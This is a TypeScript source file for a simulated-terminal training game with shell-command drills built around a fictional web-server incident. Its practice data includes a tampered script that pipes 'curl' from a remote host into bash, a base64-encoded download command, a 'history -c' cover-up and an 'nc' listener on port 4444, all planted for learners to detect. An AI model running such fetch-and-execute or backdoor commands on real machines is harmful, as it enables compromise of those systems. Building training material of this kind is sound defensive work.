// The command dojo (/commands/practice): a practice machine plus drills you
// solve by typing real commands into the simulated terminal. Expected results
// (counts, sorted output, the busiest IP…) are computed from the same data the
// files are built from, so checks can't drift out of sync with the files.

import type { ShellSpec } from "@/lib/sim/shell";
import { makePng, makeZip } from "@/lib/sim/bytes";
import { sha256Hex } from "@/lib/sim/hash";
import type { DrillCheck } from "@/lib/drillCheck";

export type Drill = {
  id: string;
  level: number;
  title: string;
  task: string; // what to do, in plain English
  hint: string; // which command / option to reach for
  example: string; // one command that solves it
  explain: string; // shown after you solve it
  check: DrillCheck;
};

export const LEVELS = [
  "Find your way around",
  "Read files",
  "Search",
  "Count, sort and columns",
  "Pipes and saving output",
  "Inspect and decode",
  "Find and audit",
  "Create and organise files",
  "Change text",
  "Check and compare",
  "Triage a machine",
  "Investigate an incident",
];

const HOME = "/home/learner";

// ── Practice data ────────────────────────────────────────────────────────────
const accessRows: [string, string, string, number, number][] = [
  ["10.0.0.5", "GET", "/", 200, 5120], ["10.0.0.8", "GET", "/products", 200, 8090],
  ["203.0.113.7", "GET", "/admin", 404, 512], ["203.0.113.7", "GET", "/.env", 404, 512],
  ["10.0.0.5", "GET", "/products/42", 200, 3300], ["198.51.100.4", "POST", "/login", 200, 640],
  ["203.0.113.7", "GET", "/backup.zip", 404, 512], ["10.0.0.8", "GET", "/cart", 200, 2100],
  ["203.0.113.7", "GET", "/wp-login.php", 404, 512], ["10.0.0.5", "POST", "/checkout", 500, 128],
  ["203.0.113.7", "GET", "/.git/config", 404, 512], ["198.51.100.4", "GET", "/account", 200, 4400],
  ["10.0.0.8", "GET", "/", 200, 5120], ["203.0.113.7", "GET", "/phpmyadmin", 404, 512],
  ["10.0.0.5", "GET", "/help", 200, 1900], ["203.0.113.7", "GET", "/server-status", 404, 512],
  ["198.51.100.4", "GET", "/logout", 302, 0], ["10.0.0.8", "POST", "/checkout", 500, 128],
  ["203.0.113.7", "GET", "/config.php", 404, 512], ["10.0.0.5", "GET", "/products", 200, 8090],
];
const accessLines = accessRows.map(([ip, m, p, st, b], i) =>
  `${ip} - - [23/Oct/2026:09:${String(10 + i).padStart(2, "0")}:${String((i * 7) % 60).padStart(2, "0")} +0000] "${m} ${p} HTTP/1.1" ${st} ${b}`);
const notFound = accessLines.filter((l) => l.includes(`" 404 `));
const ipCounts = accessRows.reduce<Record<string, number>>((m, [ip]) => ((m[ip] = (m[ip] ?? 0) + 1), m), {});
const [topIp, topCount] = Object.entries(ipCounts).sort((a, b) => b[1] - a[1])[0];

const authRows: [string, string, string][] = [
  ["Failed", "root", "203.0.113.7"], ["Failed", "root", "203.0.113.7"], ["Failed", "admin", "203.0.113.7"],
  ["Accepted", "alice", "10.0.0.5"], ["Failed", "root", "203.0.113.7"], ["Failed", "oracle", "192.0.2.50"],
  ["Failed", "guest", "203.0.113.7"], ["Failed", "admin", "203.0.113.7"], ["Failed", "test", "192.0.2.50"],
  ["Failed", "root", "203.0.113.7"], ["Failed", "admin", "192.0.2.50"], ["Accepted", "deploy", "198.51.100.4"],
];
const authLines = authRows.map(([a, u, ip], i) => `Oct 23 09:${String(14 + i).padStart(2, "0")}:01 web01 sshd[812]: ${a} password for ${u} from ${ip} port ${51022 + i} ssh2`);
const failedCount = authRows.filter((r) => r[0] === "Failed").length;

const appLines = [
  "2026-10-23 09:00:01 INFO  service started",
  "2026-10-23 09:02:13 INFO  user alice logged in",
  "2026-10-23 09:05:40 WARN  disk usage at 81%",
  "2026-10-23 09:07:02 ERROR payment gateway timeout",
  "2026-10-23 09:07:05 INFO  retrying payment",
  "2026-10-23 09:07:09 ERROR payment gateway timeout",
  "2026-10-23 09:12:30 WARN  slow response from /search (2.4s)",
  "2026-10-23 09:15:00 ERROR database connection lost",
  "2026-10-23 09:15:04 INFO  database reconnected",
  "2026-10-23 09:20:00 INFO  nightly report generated",
];

const users = [["alice", "security", "analyst"], ["bob", "engineering", "developer"], ["chen", "security", "lead"], ["dana", "support", "agent"], ["eli", "engineering", "devops"], ["fatima", "finance", "manager"], ["gabe", "security", "intern"], ["hana", "engineering", "developer"]];
const usersCsv = ["name,department,role", ...users.map((u) => u.join(","))];

const scores = [88, 42, 97, 15, 63, 71, 29, 100, 54];
const secretMessage = "You decoded it! Command line skills unlocked.";
const pngComment = "dojo-graduate-2026";

const text = (lines: string[]) => lines.join("\n") + "\n";

const notesLines = ["Welcome to the command dojo!", "Every drill here can be solved with the commands in the handbook.", "Tip: press the up arrow to reuse your last command."];
const servers = ["web01", "db01", "web02", "web01", "mail01", "db01", "web01", "backup01"];

const passwd = [
  "root:x:0:0:root:/root:/bin/bash",
  "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
  "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
  "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin",
  "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin",
  "postgres:x:113:120:PostgreSQL administrator:/var/lib/postgresql:/bin/bash",
  "learner:x:1000:1000::/home/learner:/bin/bash",
  "deploy:x:1001:1001::/home/deploy:/bin/bash",
];
const accounts = passwd.map((l) => l.split(":")[0]);
const shellAccounts = passwd.filter((l) => l.endsWith("/bin/bash")).map((l) => l.split(":")[0]);

const rot13 = (s: string) => s.replace(/[a-z]/gi, (c) => { const b = c <= "Z" ? 65 : 97; return String.fromCharCode(((c.charCodeAt(0) - b + 13) % 26) + b); });
const rot13Plain = "Meet at the blue door at nine.";
const backwardsPlain = "Reading backwards is an old CTF trick.";

// Two downloads and the publisher's checksum list: update.sh was tampered with
// after the checksums were published (one line added at the end).
const toolSh = text(["#!/bin/bash", "# tool.sh - shows how much space the website uses", "du -sh ~/projects/website"]);
const updateShOriginal = text(["#!/bin/bash", "# update.sh - fetches the latest website files", "echo \"updating website...\""]);
const updateSh = updateShOriginal + "curl -s http://203.0.113.7/sync.sh | bash\n";
const toolHash = sha256Hex(toolSh);
const checksums = text([`${toolHash}  tool.sh`, `${sha256Hex(updateShOriginal)}  update.sh`]);

const firewallOld = ["# web01 firewall rules", "allow 22/tcp from 10.0.0.0/8", "allow 80/tcp from any", "allow 443/tcp from any", "deny all"];
const firewallNew = ["# web01 firewall rules", "allow 22/tcp from any", "allow 80/tcp from any", "allow 443/tcp from any", "allow 4444/tcp from any", "deny all"];

// The incident story behind levels 11–12: deploy's password was used from
// 198.51.100.4, a script was fetched from 203.0.113.7 and a listener started.
const decodedCmd = "curl -s http://203.0.113.7/sync.sh -o /tmp/.cache/sync.sh";
const encodedCmd = btoa(decodedCmd);
const deployHistory = ["cd /tmp", "mkdir .cache", `echo ${encodedCmd} | base64 -d | bash`, "bash /tmp/.cache/sync.sh &", "history -c"];

const failedBy = authRows.filter((r) => r[0] === "Failed").reduce<Record<string, number>>((m, r) => ((m[r[2]] = (m[r[2]] ?? 0) + 1), m), {});
const triedUsers = [...new Set(authRows.filter((r) => r[0] === "Failed").map((r) => r[1]))].sort();
const loggedIn = authRows.filter((r) => r[0] === "Accepted").map((r) => `${r[1]} ${r[2]}`);
const scannerPaths = accessRows.filter((r) => r[0] === "203.0.113.7").map((r) => r[2]);
const top3 = Object.entries(ipCounts).sort((a, b) => b[1] - a[1]).slice(0, 3);

export const dojoSpec: ShellSpec = {
  user: "learner", host: "dojo", home: HOME, groups: ["learner"],
  id: "uid=1000(learner) gid=1000(learner) groups=1000(learner)",
  uname: "Linux dojo 6.8.0-45-generic #45-Ubuntu SMP x86_64 GNU/Linux",
  motd: "Welcome to the command dojo — a safe practice machine. Follow the drill above; type help any time.",
  files: {
    [`${HOME}/notes.txt`]: text(notesLines),
    [`${HOME}/.hidden_note`]: text(["You found the hidden note.", "Files whose names start with a dot are hidden from a plain ls."]),
    [`${HOME}/todo.txt`]: text(["1. learn ls and cd", "2. read logs with head and tail", "3. search with grep", "4. count with wc", "5. chain commands with |"]),
    [`${HOME}/logs/access.log`]: text(accessLines),
    [`${HOME}/logs/auth.log`]: text(authLines),
    [`${HOME}/logs/app.log`]: text(appLines),
    [`${HOME}/data/users.csv`]: text(usersCsv),
    [`${HOME}/data/scores.txt`]: text(scores.map(String)),
    [`${HOME}/projects/website/index.html`]: text(["<!doctype html>", "<title>Shop</title>", "<h1>Welcome to the shop</h1>"]),
    [`${HOME}/projects/website/config.bak`]: text(["# old config backup - this should never be left on a server", "db_host=localhost", "DB_PASSWORD=changeme123", "debug=true"]),
    [`${HOME}/projects/website/assets/old/styles.css.bak`]: text(["body { font-family: sans-serif; }"]),
    [`${HOME}/downloads/photo.png`]: makePng({ width: 800, height: 600, text: [["Comment", pngComment]] }),
    [`${HOME}/downloads/report.pdf`]: makeZip([{ name: "readme.txt", data: "This 'PDF' is really a zip archive.\n" }]),
    [`${HOME}/messages/encoded.txt`]: btoa(secretMessage) + "\n",
    [`${HOME}/messages/rot13.txt`]: rot13(rot13Plain) + "\n",
    [`${HOME}/messages/backwards.txt`]: [...backwardsPlain].reverse().join("") + "\n",
    [`${HOME}/scratch.tmp`]: "leftover temporary file - safe to delete\n",
    [`${HOME}/scripts/backup.sh`]: text(["#!/bin/bash", "# copies the shop's home page to /tmp as a quick backup", "cp ~/projects/website/index.html /tmp/", "echo \"backup done\""]),
    [`${HOME}/data/api-token.txt`]: "token=demo-only-0000 (practice value, not a real secret)\n",
    [`${HOME}/data/servers.txt`]: text(servers),
    [`${HOME}/projects/website/README.md`]: text(["# Shop website", "Static pages for the demo shop."]),
    [`${HOME}/projects/docs/readme.txt`]: text(["Team docs live here."]),
    [`${HOME}/downloads/tool.sh`]: toolSh,
    [`${HOME}/downloads/update.sh`]: updateSh,
    [`${HOME}/downloads/CHECKSUMS.txt`]: checksums,
    [`${HOME}/config/firewall.old`]: text(firewallOld),
    [`${HOME}/config/firewall.new`]: text(firewallNew),
    [`${HOME}/logs/deploy_history.txt`]: text(deployHistory),
    "/etc/hostname": "dojo\n",
    "/etc/passwd": text(passwd),
    "/usr/bin/passwd": "\x7fELF binary",
    "/usr/bin/sudo": "\x7fELF binary",
    "/usr/local/bin/cleanup": "\x7fELF binary",
    "/root/notes.txt": "admin only\n",
  },
  meta: {
    "/usr/bin/passwd": { mode: "-rwsr-xr-x", owner: "root" },
    "/usr/bin/sudo": { mode: "-rwsr-xr-x", owner: "root" },
    "/usr/local/bin/cleanup": { mode: "-rwsr-xr-x", owner: "root" },
    "/root": { mode: "drwx------", owner: "root", noread: true },
  },
  procs: [
    { user: "root", pid: 1, cmd: "/sbin/init" },
    { user: "root", pid: 612, cmd: "sshd: /usr/sbin/sshd -D [listener]" },
    { user: "root", pid: 640, cmd: "/usr/sbin/cron -f" },
    { user: "postgres", pid: 655, cmd: "/usr/lib/postgresql/16/bin/postgres -D /var/lib/postgresql/16/main" },
    { user: "root", pid: 700, cmd: "nginx: master process /usr/sbin/nginx" },
    { user: "www-data", pid: 701, cmd: "nginx: worker process" },
    { user: "deploy", pid: 1337, cmd: "/bin/bash /tmp/.cache/sync.sh", start: "09:26", cpu: "38.5" },
    { user: "deploy", pid: 1340, cmd: "nc -lvnp 4444", start: "09:26" },
  ],
  ports: [
    { port: 22, proc: "sshd", pid: 612 },
    { port: 80, proc: "nginx", pid: 700 },
    { port: 4444, proc: "nc", pid: 1340 },
    { port: 5432, addr: "127.0.0.1", proc: "postgres", pid: 655 },
  ],
};

// ── Drills ───────────────────────────────────────────────────────────────────
export const drills: Drill[] = [
  // Level 1 — find your way around
  { id: "pwd", level: 1, title: "Where am I?", task: "Print the folder you're currently in.", hint: "There's a three-letter command that prints the working directory.", example: "pwd",
    explain: "`pwd` = print working directory. Your home folder is /home/learner — every new session starts there.", check: { uses: ["pwd"], out: [HOME] } },
  { id: "ls", level: 1, title: "What's here?", task: "List the files and folders in your home folder.", hint: "Use the list command on its own.", example: "ls",
    explain: "`ls` lists what's in the current folder. Folders and files are shown side by side.", check: { uses: ["ls"], out: ["notes.txt", "logs"] } },
  { id: "ls-a", level: 1, title: "Show hidden files", task: "List everything in your home folder, including hidden files.", hint: "Add the option that means \"all\" to ls.", example: "ls -a",
    explain: "`-a` shows hidden files — names starting with a dot, like `.hidden_note`. Attackers and admins both hide things this way, so always check.", check: { uses: ["ls"], out: [".hidden_note"] } },
  { id: "cd", level: 1, title: "Move into a folder", task: "Move into the logs folder.", hint: "Change directory with cd followed by the folder name.", example: "cd logs",
    explain: "`cd logs` moves you into logs — notice the prompt now shows `~/logs`.", check: { uses: ["cd"], cwd: `${HOME}/logs` } },
  { id: "cd-home", level: 1, title: "Go home", task: "Go back to your home folder.", hint: "cd .. goes up one level; cd on its own (or cd ~) goes straight home.", example: "cd ~",
    explain: "`cd` on its own, `cd ~` and `cd ..` (from logs) all get you home. `~` is shorthand for your home folder.", check: { uses: ["cd"], cwd: HOME } },

  // Level 2 — read files
  { id: "cat", level: 2, title: "Read a file", task: "Show the contents of notes.txt.", hint: "cat prints a whole file.", example: "cat notes.txt",
    explain: "`cat` prints a file from top to bottom — perfect for short files.", check: { uses: ["cat"], out: ["Welcome to the command dojo!"] } },
  { id: "cat-hidden", level: 2, title: "Read the hidden note", task: "Read the hidden note in your home folder.", hint: "Hidden files are read like any other — just include the dot in the name.", example: "cat .hidden_note",
    explain: "The dot is part of the file name. Tab completion helps: type `cat .h` and press Tab.", check: { out: ["You found the hidden note."] } },
  { id: "head", level: 2, title: "Just the start", task: "Show only the first 3 lines of logs/access.log.", hint: "head shows the start of a file; -n sets how many lines.", example: "head -n 3 logs/access.log",
    explain: "`head -n 3` shows the first 3 lines — a quick way to see what a log's lines look like before digging in.", check: { uses: ["head"], exact: text(accessLines.slice(0, 3)) } },
  { id: "tail", level: 2, title: "Just the end", task: "Show only the last 2 lines of logs/app.log.", hint: "tail is head's opposite.", example: "tail -n 2 logs/app.log",
    explain: "Logs grow at the bottom, so `tail` shows the most recent events.", check: { uses: ["tail"], exact: text(appLines.slice(-2)) } },

  // Level 3 — search
  { id: "grep", level: 3, title: "Find the errors", task: "Show every line in logs/app.log that contains ERROR.", hint: "grep prints the lines that match a word.", example: "grep ERROR logs/app.log",
    explain: "`grep WORD file` keeps only matching lines — the fastest way to cut a log down to what matters.", check: { uses: ["grep"], exact: text(appLines.filter((l) => l.includes("ERROR"))) } },
  { id: "grep-c", level: 3, title: "Count the failures", task: `Count how many failed logins are in logs/auth.log.`, hint: "grep -c counts matching lines — or pipe grep into wc -l.", example: "grep -c Failed logs/auth.log",
    explain: `There are ${failedCount}. \`grep -c\` counts matches; \`grep Failed logs/auth.log | wc -l\` gives the same answer by piping into a line counter.`, check: { usesAny: ["grep", "wc"], exact: `${failedCount}\n` } },
  { id: "grep-i", level: 3, title: "Ignore upper and lower case", task: "Search projects/website/config.bak for the word password, ignoring upper/lower case.", hint: "grep -i ignores case, so password matches PASSWORD.", example: "grep -i password projects/website/config.bak",
    explain: "`-i` matched `DB_PASSWORD`. A backup file with a database password left on a web server is a classic finding — the fix is to delete it and change the password.", check: { uses: ["grep"], cmdRe: "grep\\s+(-\\w*i|--ignore-case)", out: ["DB_PASSWORD=changeme123"] } },

  // Level 4 — count, sort and columns
  { id: "wc", level: 4, title: "Count lines", task: "Find out how many lines data/users.csv has.", hint: "wc -l counts lines.", example: "wc -l data/users.csv",
    explain: `\`wc -l\` counted ${usersCsv.length} lines — 1 header row plus ${users.length} users.`, check: { uses: ["wc"], outRe: `^\\s*${usersCsv.length}\\b` } },
  { id: "cut", level: 4, title: "Pick a column", task: "Show just the names (the first column) from data/users.csv.", hint: "cut -d, -f1 splits each line at commas and keeps field 1 (awk -F, '{print $1}' works too).", example: "cut -d, -f1 data/users.csv",
    explain: "`-d,` says columns are separated by commas, `-f1` keeps the first column. Spreadsheet exports (CSV) are everywhere in investigations.", check: { usesAny: ["cut", "awk"], out: users.map((u) => u[0]), outNot: [","] } },
  { id: "sort", level: 4, title: "Biggest first", task: "Sort the numbers in data/scores.txt from highest to lowest.", hint: "sort -n sorts as numbers; -r reverses the order.", example: "sort -nr data/scores.txt",
    explain: "`-n` sorts 100 after 97 (as numbers, not text) and `-r` puts the biggest first.", check: { uses: ["sort"], exact: text([...scores].sort((a, b) => b - a).map(String)) } },
  { id: "uniq-c", level: 4, title: "Who visited most?", task: "Show how many requests each IP address made in logs/access.log.", hint: "Take the first column (awk '{print $1}'), sort it, then uniq -c counts each one.", example: "awk '{print $1}' logs/access.log | sort | uniq -c | sort -nr",
    explain: `${topIp} made ${topCount} requests — all of them to pages that don't exist (404s). That's a scanner. Counting by source is one of the most useful patterns in security.`, check: { uses: ["uniq"], outRe: `^\\s*${topCount}\\s+${topIp.replace(/\./g, "\\.")}\\s*$` } },

  // Level 5 — pipes and saving output
  { id: "redirect", level: 5, title: "Save the 404s", task: "Save every 404 line from logs/access.log into a new file called notfound.txt.", hint: "grep finds the lines; > sends the output into a file instead of the screen.", example: "grep ' 404 ' logs/access.log > notfound.txt",
    explain: "`>` redirects output into a file (it creates or overwrites it; `>>` would add to the end). Saving evidence to a file is everyday investigation work.", check: { file: { paths: [`${HOME}/notfound.txt`, `${HOME}/logs/notfound.txt`], has: [" 404 "], not: [" 200 "], lines: notFound.length } } },
  { id: "count-file", level: 5, title: "Count your evidence", task: "Count the lines in the notfound.txt you just made.", hint: "wc -l, pointed at your new file.", example: "wc -l notfound.txt",
    explain: `${notFound.length} not-found requests. Building results step by step — filter, save, count — is how bigger investigations work.`, check: { usesAny: ["wc", "grep"], outRe: `^\\s*${notFound.length}\\b` } },

  // Level 6 — inspect and decode
  { id: "file", level: 6, title: "What is it really?", task: "Find out what kind of file downloads/report.pdf really is.", hint: "file reads a file's first bytes and ignores its name.", example: "file downloads/report.pdf",
    explain: "It's a Zip archive pretending to be a PDF. Never trust an extension — `file` checks the content.", check: { uses: ["file"], out: ["Zip archive"] } },
  { id: "base64", level: 6, title: "Decode a message", task: "Decode the Base64 message in messages/encoded.txt.", hint: "base64 -d decodes.", example: "base64 -d messages/encoded.txt",
    explain: "Base64 is an encoding, not encryption — anyone can reverse it with `base64 -d`, no key needed.", check: { uses: ["base64"], out: [secretMessage] } },
  { id: "strings", level: 6, title: "Text inside a picture", task: "Find the readable text hidden inside downloads/photo.png.", hint: "strings pulls readable text out of a binary file.", example: "strings downloads/photo.png",
    explain: `\`strings\` found "${pngComment}" in the image's metadata. Images often carry hidden notes, author names or locations.`, check: { uses: ["strings"], out: [pngComment] } },

  // Level 7 — find and audit
  { id: "find-name", level: 7, title: "Hunt for backups", task: "Find every file ending in .bak inside the projects folder.", hint: "find projects -name '*.bak' — quotes keep the * for find.", example: "find projects -name '*.bak'",
    explain: "`find` searches folders recursively; `-name '*.bak'` matches any name ending in .bak. Forgotten backups are a common leak.", check: { uses: ["find"], out: ["config.bak", "styles.css.bak"] } },
  { id: "find-suid", level: 7, title: "Audit SUID programs", task: "List every program with the SUID bit set, without any \"Permission denied\" errors in the output.", hint: "find / -perm -4000 finds SUID files; add 2>/dev/null to throw the errors away.", example: "find / -perm -4000 2>/dev/null",
    explain: "SUID programs run with their owner's powers, so admins review them. `/usr/local/bin/cleanup` isn't a standard tool — that's the one to look into. `2>/dev/null` hid the noise from folders you can't read.", check: { uses: ["find"], out: ["/usr/local/bin/cleanup"], outNot: ["Permission denied"] } },

  // ── Added later. New drills go at the end so saved progress (one flag per
  // drill, by position) keeps pointing at the right drill; `drillOrder` below
  // shows them grouped by level. ──────────────────────────────────────────────

  // Level 1 — find your way around
  { id: "ls-l", level: 1, title: "See the details", task: "List your home folder with details: permissions, owner, size and date.", hint: "ls has a \"long\" option, -l.", example: "ls -l",
    explain: "Each line starts with the permissions (`d` = folder, then read/write/run for owner, group and everyone), then the owner, the size and the date. You'll read permissions in level 8.", check: { uses: ["ls"], cmdRe: "ls\\s+(-\\w*l|--format=long)", out: ["drwxr-xr-x", "learner"] } },
  { id: "whoami", level: 1, title: "Who am I?", task: "Print the name of the user you're logged in as.", hint: "The command is literally the question, written as one word.", example: "whoami",
    explain: "`whoami` prints your username; `id` adds your groups too. On a real investigation, always confirm which account you're using before you change anything.", check: { usesAny: ["whoami", "id"], out: ["learner"] } },
  { id: "uname", level: 1, title: "Which system is this?", task: "Show everything about this machine's operating system and kernel.", hint: "uname prints the OS; add the option for \"all\".", example: "uname -a",
    explain: "`uname -a` shows the OS, the machine name and the kernel version (6.8.0-45 here). Defenders compare kernel versions against security advisories to decide what needs patching.", check: { uses: ["uname"], out: ["Linux dojo 6.8.0-45-generic"] } },

  // Level 2 — read files
  { id: "middle", level: 2, title: "Lines from the middle", task: "Show only lines 3, 4 and 5 of logs/access.log.", hint: "Take the first 5 lines with head, then the last 3 of those with tail — or let sed print a range.", example: "head -n 5 logs/access.log | tail -n 3",
    explain: "`head -n 5 | tail -n 3` keeps lines 3–5. `sed -n '3,5p' logs/access.log` does it in one step: `-n` = print nothing unless told, `3,5p` = print lines 3 to 5.", check: { usesAny: ["head", "tail", "sed"], exact: text(accessLines.slice(2, 5)) } },

  // Level 3 — search
  { id: "grep-v", level: 3, title: "Hide the noise", task: "Show every line of logs/app.log that is NOT an INFO line.", hint: "grep -v flips the match: it keeps the lines that don't contain the word.", example: "grep -v INFO logs/app.log",
    explain: "`-v` (invert) removes the routine lines and leaves the warnings and errors. Filtering out what you already understand is often faster than searching for what you don't.", check: { uses: ["grep"], exact: text(appLines.filter((l) => !l.includes("INFO"))) } },
  { id: "grep-n", level: 3, title: "Which line is it on?", task: "Show the ERROR lines in logs/app.log together with their line numbers.", hint: "grep -n puts the line number in front of each match.", example: "grep -n ERROR logs/app.log",
    explain: "`-n` adds `line:` in front of each match. Line numbers let you point a colleague at the exact place, or jump there in an editor.", check: { uses: ["grep"], out: appLines.flatMap((l, i) => (l.includes("ERROR") ? [`${i + 1}:${l}`] : [])) } },
  { id: "grep-r", level: 3, title: "Search a whole folder", task: "Search every file inside the projects folder for the word password, in any upper/lower case.", hint: "grep -r searches folders recursively; combine it with -i.", example: "grep -ri password projects",
    explain: "`-r` searched every file under projects and printed `file:line` for each hit — `config.bak` holds a database password. `grep -ri password` across a web folder is a standard check for leaked secrets.", check: { uses: ["grep"], out: ["config.bak:", "DB_PASSWORD=changeme123"] } },

  // Level 4 — count, sort and columns
  { id: "sort-u", level: 4, title: "Remove duplicates", task: "data/servers.txt lists some servers more than once. Show each server name once, sorted.", hint: "sort -u sorts and drops repeated lines (sort | uniq does the same).", example: "sort -u data/servers.txt",
    explain: `\`-u\` = unique. ${servers.length} lines became ${new Set(servers).size} servers. Handy for turning a messy list of hosts, users or IPs into a clean inventory.`, check: { usesAny: ["sort"], exact: text([...new Set(servers)].sort()) } },
  { id: "awk-cols", level: 4, title: "Two columns at once", task: "For every request in logs/access.log, show just the page requested and the status code (the 7th and 9th words).", hint: "awk '{print $7, $9}' prints words 7 and 9 with a space between.", example: "awk '{print $7, $9}' logs/access.log",
    explain: "awk splits each line on spaces: `$7` is the path, `$9` the status. Counting words to find the right column number is a skill in itself — `head -n 1` first and count.", check: { usesAny: ["awk", "cut"], exact: text(accessRows.map((r) => `${r[2]} ${r[3]}`)) } },
  { id: "cut-passwd", level: 4, title: "List the accounts", task: "Show the name of every account on this machine (the first field of /etc/passwd, where fields are separated by colons).", hint: "cut -d: -f1 — the delimiter is a colon.", example: "cut -d: -f1 /etc/passwd",
    explain: `/etc/passwd has one account per line: name:x:uid:gid:info:home:shell. ${accounts.length} accounts here — most are \"service accounts\" for programs, not people.`, check: { usesAny: ["cut", "awk"], exact: text(accounts) } },

  // Level 5 — pipes and saving output
  { id: "append", level: 5, title: "Add without erasing", task: "Add the line reviewed auth.log to the end of todo.txt, keeping everything already in it.", hint: "echo prints the text; >> adds it to the end of a file (a single > would wipe the file first).", example: "echo \"reviewed auth.log\" >> todo.txt",
    explain: "`>>` appends; `>` replaces. Mixing them up is how people lose notes — when in doubt, use `>>`.", check: { usesAny: ["echo"], cmdRe: ">>", file: { paths: [`${HOME}/todo.txt`], has: ["1. learn ls and cd", "reviewed auth.log"] } } },
  { id: "tee", level: 5, title: "See it and save it", task: "Show the failed logins from logs/auth.log on screen and save them to failed.txt in the same command.", hint: "Pipe grep into tee: tee writes what it receives to a file and also passes it on to the screen.", example: "grep Failed logs/auth.log | tee failed.txt",
    explain: "`tee` is a T-junction for output: one copy to the file, one to the screen. Perfect when you want to watch results and keep evidence at the same time.", check: { uses: ["tee"], out: [authLines.find((l) => l.includes("Failed"))!], file: { paths: [`${HOME}/failed.txt`, `${HOME}/logs/failed.txt`], has: ["Failed"], lines: failedCount } } },
  { id: "top3", level: 5, title: "Top three visitors", task: "Show only the 3 IP addresses that made the most requests in logs/access.log, with their counts.", hint: "Count per IP like in level 4 (… | sort | uniq -c | sort -nr), then cut it to the top with head -n 3.", example: "awk '{print $1}' logs/access.log | sort | uniq -c | sort -nr | head -n 3",
    explain: "Ending a pipeline with `head` turns a long ranking into a \"top N\". This exact pipeline answers \"who's hitting us hardest?\" on any web server.", check: { uses: ["head"], outLines: top3.map(([ip, n]) => `${n} ${ip}`), outNot: ["198.51.100.4"] } },

  // Level 6 — inspect and decode
  { id: "xxd", level: 6, title: "Look at the raw bytes", task: "Show the first 16 bytes of downloads/photo.png as hex.", hint: "xxd shows a hex dump; -l limits how many bytes.", example: "xxd -l 16 downloads/photo.png",
    explain: "Every PNG starts with the bytes `89 50 4e 47` — the letters PNG. These \"magic bytes\" are exactly what `file` reads to identify a file.", check: { uses: ["xxd"], out: ["8950 4e47"] } },
  { id: "b64-encode", level: 6, title: "Encode a message", task: "Encode the word hello as Base64.", hint: "Pipe echo into base64 (without -d, it encodes).", example: "echo -n hello | base64",
    explain: "`echo -n hello | base64` gives `aGVsbG8=`. Without `-n`, echo adds an invisible newline and you get `aGVsbG8K` — the same word plus a line break. Tiny details like this change encoded output.", check: { uses: ["base64"], cmdRe: "^(?!.*\\s-d\\b)", outRe: "^aGVsbG8[=K]$" } },
  { id: "unzip-l", level: 6, title: "Peek inside an archive", task: "List what's inside downloads/report.pdf (it's really a zip) without extracting anything.", hint: "unzip has a list-only option, -l.", example: "unzip -l downloads/report.pdf",
    explain: "`unzip -l` shows the contents without writing any files — the safe first step with any archive you didn't make yourself.", check: { uses: ["unzip"], cmdRe: "unzip\\s+-l", out: ["readme.txt"] } },

  // Level 7 — find and audit
  { id: "find-dirs", level: 7, title: "Only the folders", task: "List every folder (not files) inside projects.", hint: "find projects -type d — d for directory (f would be files).", example: "find projects -type d",
    explain: "`-type d` keeps folders, `-type f` keeps files. Mapping the folder layout first makes a big unfamiliar system much less confusing.", check: { uses: ["find"], cmdRe: "-type\\s+d", out: ["projects/website/assets/old"], outNot: ["index.html"] } },
  { id: "find-iname", level: 7, title: "Any capitalisation", task: "Find every file whose name starts with readme, whether it's written README, Readme or readme.", hint: "-iname is -name that ignores upper/lower case.", example: "find . -iname 'readme*'",
    explain: "`-iname` matched both README.md and readme.txt. File names on Linux are case-sensitive, so -iname saves you from missing files.", check: { uses: ["find"], cmdRe: "-iname", out: ["README.md", "readme.txt"] } },

  // Level 8 — create and organise files
  { id: "mkdir", level: 8, title: "Make an evidence folder", task: "Create a folder called evidence in your home folder.", hint: "mkdir = make directory.", example: "mkdir evidence",
    explain: "Keeping copies of what you collect in one folder is the first habit of any investigation. `mkdir -p a/b/c` would create a whole chain of folders at once.", check: { uses: ["mkdir"], dir: `${HOME}/evidence` } },
  { id: "touch", level: 8, title: "Start your case notes", task: "Create an empty file called case-notes.txt inside the evidence folder (make the folder first if it isn't there).", hint: "touch creates an empty file.", example: "touch evidence/case-notes.txt",
    explain: "`touch` creates an empty file (or updates the time on an existing one). Now you have somewhere to write what you find, with `echo … >> evidence/case-notes.txt`.", check: { uses: ["touch"], file: { paths: [`${HOME}/evidence/case-notes.txt`] } } },
  { id: "cp", level: 8, title: "Copy the evidence", task: "Copy logs/auth.log into the evidence folder.", hint: "cp SOURCE DESTINATION — when the destination is a folder, the file keeps its name.", example: "cp logs/auth.log evidence/",
    explain: "Work on a copy, never the original — that keeps the original evidence untouched. The trailing `/` makes it clear that evidence is a folder.", check: { uses: ["cp"], file: { paths: [`${HOME}/evidence/auth.log`], has: ["sshd"] } } },
  { id: "mv", level: 8, title: "Rename it", task: "Rename evidence/auth.log to evidence/auth-web01.log so you know which server it came from.", hint: "mv renames when the destination is a new name in the same folder.", example: "mv evidence/auth.log evidence/auth-web01.log",
    explain: "`mv` both moves and renames — renaming is just moving to a new name. Clear names (server, date) save confusion when you collect logs from many machines.", check: { uses: ["mv"], file: { paths: [`${HOME}/evidence/auth-web01.log`], has: ["sshd"] }, missing: [`${HOME}/evidence/auth.log`] } },
  { id: "rm", level: 8, title: "Clean up", task: "Delete the leftover file scratch.tmp from your home folder.", hint: "rm removes files. Double-check the name before you press Enter.", example: "rm scratch.tmp",
    explain: "There's no recycle bin on the command line: `rm` is permanent. Pros run `ls` on the same name first to see exactly what will go. (This practice machine can be reset below.)", check: { uses: ["rm"], missing: [`${HOME}/scratch.tmp`] } },
  { id: "chmod-x", level: 8, title: "Make a script runnable", task: "Give scripts/backup.sh permission to run (the execute bit).", hint: "chmod +x adds execute permission. Check with ls -l afterwards.", example: "chmod +x scripts/backup.sh",
    explain: "`+x` turned `-rw-r--r--` into `-rwxr-xr-x`. Scripts need the x bit before you can run them with `./script.sh`.", check: { uses: ["chmod"], mode: { path: `${HOME}/scripts/backup.sh`, re: "^-..x" } } },
  { id: "chmod-600", level: 8, title: "Lock down a secret", task: "data/api-token.txt can be read by everyone. Make it readable and writable by you only.", hint: "In numbers: 6 = read + write, 0 = nothing. Owner, group, everyone → 600.", example: "chmod 600 data/api-token.txt",
